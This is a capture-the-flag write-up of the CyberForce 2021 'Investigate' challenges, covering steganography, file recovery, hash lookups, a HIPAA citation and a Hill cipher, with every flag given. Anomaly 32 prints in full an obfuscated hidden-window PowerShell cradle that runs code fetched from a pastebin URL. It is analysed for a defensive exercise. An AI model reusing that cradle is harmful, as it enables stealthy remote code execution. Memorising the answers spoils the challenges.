---
title: "CyberForce 2021 - Investigate"
categories:
  - CyberForce
tags:
  - CyberForce
  - CyberForce-2021
  - CyberForce Adventurer
---

# Investigate
One of the categories in the Department of Energy's CyberForce Program - Conquer the Hill: Adventurer Edition 2021

{% include toc %}

## Investigate: Anomaly 10 (20pts)
The procurement office forgot to renew your company’s license for the SIEM product you are using, and so it is no longer functioning.  Your boss thinks the SIEM isn’t worth what you are paying for it anyway.  Unfortunately, this is making your job of threat hunting difficult.  Based on some threat intelligence you have received; you suspect that you may have malware running in your network.  Can you search through the log files to find the MD5 hash of the process beaconing to schoolofhardknocks.xyz?

syntax hint: no spaces

## Investigate: Anomaly 34 (20pts)
A user at your company was noticed sending an email to someone offsite of a picture of Donald Duck different times throughout the year. There is obviously nothing in our policy that states user's cannot send pictures of cartoon characters, but the fact that they have done it before, and there is no context sent along with the picture makes things seem a little off. It's probably nothing, but see if there is something more going on with this picture. 

syntax hint: answer is not case sensitive, include spaces

### Solution

I ran some exif tools and got this to work `exiv2 donald.png`

```
File name       : donald.png
File size       : 233291 Bytes
MIME type       : image/png
Image size      : 1200 x 1985
donald.png: No Exif data found in the file
z@z:~$ zsteg donald.png 
[?] 28 bytes of extra data after image end (IEND), offset = 0x38f2f
extradata:0         .. text: "YXNlIGRvbnQgdGVsbCBteSBib3Nz"
meta date:create    .. text: "2018-06-04T02:50:07+00:00"
meta date:modify    .. [same as "meta date:create"]
```

I was missing part of the base64 string so I checked the image using bless at the bottom of the past the IEND tag you get:

`cGxlYXNlIGRvbnQgdGVsbCBteSBib3Nz` base64 decoded you get `please dont tell my boss`

Ans: `please dont tell my boss`

## Investigate: Anomaly 4 (50pts)
Jane keeps sending Bruce this weird image every Thursday afternoon. Bruce cant figure out why Jane keeps sending him this image, and he's a little freaked out. So, he asks you, his smart IT guru. Is Jane being a total weirdo, or is there something else going on?

Syntax hint: answer should be in the following format: apples_bananas_oranges_pears_grapes

### Solution

I used the command `stegseek image.jpg rockyou.txt` which got:

```
[i] Found passphrase: "URAQT")           
[i] Original filename: "Roses.txt".
[i] Extracting to "image.jpg.out".
```

Which in hindsight the password is seen on the hearts, I'm just really bad at seeing colors. 

Text file:
```
Roses are red
Memes are dank
This is my opener
To try and get a date with my coworker



Answer: Do_you_like_me_yes_or_no
```

Ans: `Do_you_like_me_yes_or_no`

## Investigate: Anomaly 5 (50pts)
You notice that, on the second Thursday of every month, your boss sends a picture of an animal to an unidentified email with the subject “Hello Again.” You begin to be suspicious, and, in anticipation, you set up for an email interception of the incoming picture for the new month and obtain the following photo. Is this a harmless love for nature, or is there a more alarming situation occurring? 

Syntax hint: answer is not case sensitive, no spaces

## Investigate: Anomaly 16 (50pts)
A recently terminated employee at your organization deleted an important file (nopeeking.txt) from their workstation before they left, and you have been tasked with recovering the information within the file. The user only deleted the file, and did not use the computer much afterwards, and so there is a high confidence level that the data still exists on the disk image, which is being provided to you. Use some digital forensics tool to recover the file and the data within.

syntax hint: no spaces

### Solution

I recovered the file using Autopsy.

File:
```
Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Non sodales neque sodales ut etiam sit amet nisl purus. Viverra tellus in hac habitasse platea dictumst vestibulum rhoncus. Amet est placerat in egestas erat. Dis parturient montes nascetur ridiculus. Iaculis urna id volutpat lacus laoreet non curabitur. Nec dui nunc mattis enim ut tellus elementum. Massa eget egestas purus viverra accumsan. Aenean vel elit scelerisque mauris pellentesque. Elementum eu facilisis sed odio morbi. Duis tristique sollicitudin nibh sit amet commodo nulla facilisi. Risus nullam eget felis eget nunc lobortis mattis aliquam. Ante metus dictum at tempor commodo ullamcorper a lacus vestibulum. Dignissim enim sit amet venenatis. Lacus laoreet non curabitur gravida arcu ac. Tellus pellentesque eu tincidunt tortor aliquam nulla.

Egestas sed tempus urna et pharetra. Dignissim enim sit amet venenatis urna cursus. Vitae congue eu consequat ac felis. Interdum posuere lorem ipsum dolor. Mi eget mauris pharetra et ultrices neque ornare aenean euismod. Aliquam ut porttitor leo a diam sollicitudin tempor id eu. Rhoncus dolor purus non enim praesent. Vestibulum rhoncus est pellentesque elit ullamcorper dignissim cras. Metus vulputate eu scelerisque felis imperdiet proin. Ut pharetra sit amet aliquam. Donec pretium vulputate sapien nec sagittis aliquam malesuada bibendum. Mauris nunc congue nisi vitae suscipit tellus. Consectetur adipiscing elit ut aliquam. Amet consectetur adipiscing elit duis tristique sollicitudin nibh sit. Id semper risus in hendrerit gravida. Amet consectetur adipiscing elit duis tristique sollicitudin nibh sit. Pretium nibh ipsum consequat nisl vel pretium lectus quam id. Enim diam vulputate ut pharetra sit amet. Dolor sed viverra ipsum nunc aliquet bibendum. Donec ultrices tincidunt arcu non sodales neque sodales ut.
Psst. The codeword for this week is {dumpsterdiver}
Nisl tincidunt eget nullam non nisi est sit amet facilisis. Lobortis scelerisque fermentum dui faucibus. Magna ac placerat vestibulum lectus mauris ultrices eros. Tempus egestas sed sed risus pretium. Scelerisque fermentum dui faucibus in ornare quam viverra orci. Facilisis mauris sit amet massa vitae tortor. Sed sed risus pretium quam vulputate dignissim suspendisse in est. Integer feugiat scelerisque varius morbi enim nunc faucibus a. Aliquet nec ullamcorper sit amet risus nullam eget felis. Turpis egestas pretium aenean pharetra magna ac placerat. Ac ut consequat semper viverra nam libero justo laoreet sit. In ornare quam viverra orci sagittis eu volutpat odio facilisis. Et malesuada fames ac turpis egestas sed tempus urna. Mattis aliquam faucibus purus in massa tempor nec. Sed viverra tellus in hac. Senectus et netus et malesuada. Feugiat pretium nibh ipsum consequat nisl. Morbi tincidunt augue interdum velit euismod in pellentesque massa. Vestibulum rhoncus est pellentesque elit ullamcorper dignissim cras tincidunt.

Tristique sollicitudin nibh sit amet commodo. Tortor posuere ac ut consequat semper viverra. Vitae elementum curabitur vitae nunc sed velit. Varius sit amet mattis vulputate enim nulla. Vel quam elementum pulvinar etiam non. Ultrices tincidunt arcu non sodales neque. Ac ut consequat semper viverra nam libero. Amet massa vitae tortor condimentum lacinia quis vel. Luctus venenatis lectus magna fringilla urna porttitor rhoncus. Ipsum suspendisse ultrices gravida dictum fusce ut placerat. Id donec ultrices tincidunt arcu non. Sit amet commodo nulla facilisi nullam vehicula ipsum. Id leo in vitae turpis massa. Semper risus in hendrerit gravida. Risus commodo viverra maecenas accumsan lacus vel facilisis volutpat est. Nec tincidunt praesent semper feugiat nibh sed pulvinar proin. Ac felis donec et odio pellentesque. Eget est lorem ipsum dolor sit. Etiam tempor orci eu lobortis elementum.

Venenatis lectus magna fringilla urna porttitor rhoncus dolor purus non. Felis imperdiet proin fermentum leo vel orci porta. Mi quis hendrerit dolor magna eget est. Amet est placerat in egestas erat imperdiet sed euismod nisi. Enim blandit volutpat maecenas volutpat blandit aliquam etiam. Vitae justo eget magna fermentum. Dignissim suspendisse in est ante in nibh mauris cursus. Massa tincidunt nunc pulvinar sapien et ligula ullamcorper. Odio pellentesque diam volutpat commodo. Nunc sed blandit libero volutpat. Eu mi bibendum neque egestas. Aliquet enim tortor at auctor urna nunc id cursus metus. Mauris rhoncus aenean vel elit scelerisque. Ultricies tristique nulla aliquet enim tortor at auctor urna.
```

Thing of notice: `Psst. The codeword for this week is {dumpsterdiver}`

Ans: `dumpsterdiver`

## Investigate: Anomaly 33 (50pts)
Provided is a list of MD5 hashes. Identify the one hash that is associated with a piece of malware.

syntax hint: answer is not case sensitive, no spaces

### Solution

Used: https://hash.cymru.com/ to mass look up the hashes

It returned 8f80cf878a3e05c06c9d03646443e41d and I checked up with https://www.virustotal.com/ 

Ans: `8f80cf878a3e05c06c9d03646443e41d`

## Investigate: Anomaly 35 (50pts)
Under what section of the HIPPA Privacy Rule states that a business associate is prohibited from using protected health information in a way that would violate the HIPPA Privacy Rule?

syntax hint: answer is not case sensitive, enter the following format:  ## ABC § ###.###

### Solution

Note: I believe through most of the competition the answer was incorrectly marked wrong. Later before it finished I checked again and noticed I got some points for it.

Ans: `45 CFR § 164.502`

## Investigate: Anomaly 32 (100pts)
An automated alert notified your security team to a potentially malicious script being executed on a users machine. Your job is to analyze the script to determine what it is doing. Note: During your analysis, the script should lead you to a sentence in English; this will be the answer you submit. 

syntax hint: answer is not case sensitive, include spaces

### Solution

The script:
```
C:\Windows\system32\cmd.exe /b /c start /b /min powershell.exe  if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\syswow64\WindowsPowerShell\v1.0\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='IEX([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(''KEludm9rZS1XZWJSZXF1ZXN0IC1VcmkgImh0dHBzOi8vcGFzdGViaW4uY29tL3Jhdy9RWlhkVWVFYiIpLkNvbnRlbnQ='')))';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);
```

I converted it from base64 using https://www.base64decode.org/ and got `(Invoke-WebRequest -Uri "https://pastebin.com/raw/QZXdUeEb").Content`. I went to the site and got `buzzin radars is buzzin yah yah yah yah`

Ans: `buzzin radars is buzzin yah yah yah yah`

## Investigate: Anomaly 96 (100pts)
Solve a cryptopuzzle for points

https://twitter.com/DOECyberForce/status/1402774074435117057

### Solution

Its an image of hill with a flag containing a matrix: `[2 3 3 5]` and `Z = 25`. With the string `ludowkgwttwik tlckquzyeztlrefhjpacc kkfh`

Its a hill cipher. I used https://asecuritysite.com/coding/hill with getting `wh|t is life without | little ad venture`

and then corrected it to the solution.

Ans: `what is life without a little adventure`